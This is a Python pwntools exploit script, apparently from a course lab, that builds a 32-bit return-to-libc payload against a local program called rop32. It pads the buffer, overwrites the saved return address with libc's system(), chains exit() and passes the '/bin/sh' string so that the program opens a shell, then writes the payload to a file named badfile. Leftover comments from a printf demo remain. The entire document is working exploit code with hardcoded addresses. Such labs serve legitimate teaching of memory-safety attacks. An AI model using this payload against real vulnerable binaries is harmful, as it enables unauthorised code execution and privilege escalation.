#!/usr/bin/python3
from pwn import *

# Set the architecture to Intel x86 (32 bit)
context.arch = 'i386'

# load libc (32-bit) 
libc = ELF('/lib32/libc.so.6')

# TODO: Find the libc base, e.g., using gdb/gef (vmmap command)
libc_base = 0xf7dce000

# libc.symbols['printf'] returns the offset of the function printf. 
# Note that this works only if the symbols exist in the binary. This is the case for printf in 
# libc as it is a dynamic library. Symbols may not exist in stripped binary. 
system_addr = libc_base + libc.symbols['system']

# get the address of exit(). We'll use this as the return address for printf later.
exit_addr = libc_base + libc.symbols['exit']

# get the shell address
# of course, we can also use environment variable
sh_offset = next(libc.search(b'/bin/sh'))
sh_addr   = libc_base + sh_offset

print(hex(sh_addr))

# fill in the buffer address the program prints
buffer_addr = 0xffffce9c

# TODO: find where the stored return address of foo is, relative to 
# the buffer. Not that the stored return address is located at 
# ebp + 4 byte 
ra_offset = 112

# Prepare the payload
# Make it so that the layout of the stack is as follows
# 
# ["Hello, World!"] --> call this address X
# [X]               --> the (first) argument of printf
# [return address]  --> the return address that printf expects
# [printf address]  --> this overwrites the stored return address of foo
# [...padding....]  --> some bytes to overflow the buffer

# First, fill up the buffer up to the point just below the stored return address
content = b'A' * ra_offset 

# now add the printf address; use pwntools function p32 to convert it to little endian byte array
content += p32(system_addr)

# fill in the return address for printf. 
content += p32(exit_addr)

# now it's a good time to work out the address to the string
# each stack element is 4 byte
# stack_element_size=4
# the string is located after the padding + 3 stack elements 
# arg_addr =  buffer_addr + ra_offset +  3 * stack_element_size 
# content += p32(arg_addr)
content += p32(sh_addr)

# finally, add the string. Don't forget the null terminator!
# content += b'Hello, World!\n\x00'

with open ("badfile", "wb") as f:
  f.write(content)

# NOTE: you can use the following code to run the rop32 program and captures its output.
# However, keep in mind that running the program from python may changes the buffer
# address, so you'll need to adjust the value of buffer_addr. 

# io = process(['./rop32'])
# print(io.recvall().decode("utf-8"))
